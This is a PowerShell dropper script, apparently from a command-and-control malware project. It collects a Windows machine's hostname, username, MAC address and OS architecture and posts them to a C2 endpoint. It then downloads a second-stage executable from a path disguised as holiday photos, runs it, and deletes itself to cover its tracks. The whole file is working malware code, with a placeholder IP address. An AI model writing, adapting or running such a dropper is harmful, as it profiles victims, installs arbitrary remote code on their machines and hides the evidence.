$bin_name = "test"
$ip = "0.0.0.0"

$url = "http://"+ $ip + ":3000/vacances/photos/"

$full_url = $url + $bin_name

# Gather information about the system
$hostname = [System.Net.Dns]::GetHostName()
$user = [Environment]::UserName
$mac = Get-NetAdapter -Physical | Select-Object -First 1 -ExpandProperty 'MacAddress'
$os = Get-ComputerInfo | Select-Object -ExpandProperty 'OsArchitecture'
$os = "Windows " + $os
$os_version = Get-ComputerInfo | Select-Object -ExpandProperty 'OsArchitecture'

$jsoninfo = @{
    hostname = $hostname
    users = $user
    mac = $mac
    os = $os
    os_version = $os_version
} | ConvertTo-Json

$json_url = "http://" + $ip + ":3000/get-info"

# send machine information to the C2
Invoke-RestMethod -Uri $json_url -Method Post -ContentType "application/json" -Body $jsoninfo | Out-Null

# output the 2nd stage to a temp file 
$output_path = [System.IO.Path]::GetTempFileName()
$tempFile = [System.IO.Path]::ChangeExtension($output_path, ".exe")

Invoke-WebRequest -Uri $full_url -OutFile $tempFile

# execute 2nd Stage
iex $tempFile

# delete dropper
Remove-Item $PSCommandPath -Force
